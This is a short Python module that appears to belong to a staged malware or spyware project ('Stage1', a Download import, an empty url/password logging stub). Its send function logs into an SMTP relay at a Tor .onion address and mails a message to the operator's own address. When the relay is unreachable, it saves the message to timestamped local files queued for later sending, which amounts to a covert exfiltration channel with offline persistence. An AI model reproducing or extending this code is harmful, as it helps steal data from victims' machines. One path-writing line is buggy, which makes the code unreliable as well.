import Stage1.GlobalVariables as var
import Stage1.Download
import smtplib
from time import strftime, gmtime


def log(url, pwd):
    pass


def send_mali(process, email, password, message):
    try:
        server = smtplib.SMTP(host="torbox3uiot6wchz.onion", port=25)
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        return True
    except ConnectionError:
        try:
            with open(var.log_root + process+"_" + strftime("%Y-%m-%d_%H-%M-%S", gmtime()), "wb") as msg:
                msg.write(message)
                msg.close()
                try:
                    with open(var.log_root + "pending", "w") as f:
                        f.write("var.log_root" + process + "_" + strftime("%Y-%m-%d_%H-%M-%S", gmtime()) + "\n")
                        f.close()
                        return True
                except:
                    return False

        except:
            return False
